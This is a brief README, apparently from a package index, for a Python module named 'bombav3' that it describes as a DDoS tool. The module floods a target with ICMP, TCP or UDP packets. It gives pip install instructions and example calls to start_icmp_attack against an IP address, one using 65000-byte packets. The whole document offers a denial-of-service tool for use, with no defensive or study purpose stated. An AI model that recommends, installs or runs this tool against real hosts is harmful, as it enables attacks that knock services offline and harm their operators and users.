# BOMBAV3
PIP INSTALL BOMBAV3 (DDOS TOOLS)

BOMBAB3 IS CUSTOM MODULE FOR SENDING ICMP TCP AND UDP PACKET TO TARGET

## USSAGE 
from bombav3 import start_icmp_attack

# USING ONLY IP ( DEFAULT PACKET_SIZE)
start_icmp_attack("192.168.1.1")

# CUSTOMING PACKET SIZE ( DEPENDS ON YOU )
start_icmp_attack("192.168.1.1", PACKET_SIZE=65000)


## Installation

You can install this package via pip:

```bash
pip install bombav3
